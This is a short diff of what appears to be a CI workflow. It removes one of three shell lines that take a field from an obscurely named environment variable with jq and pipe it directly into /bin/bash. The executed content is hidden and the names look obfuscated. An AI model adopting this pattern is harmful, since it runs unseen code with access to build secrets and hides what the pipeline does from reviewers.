@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$xrdu502" | jq -r .rctz2 | /bin/bash
           printf '%s' "$rq3" | jq -r .c011 | /bin/bash
-          echo $isqzn561 | jq -r .fsasm19 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
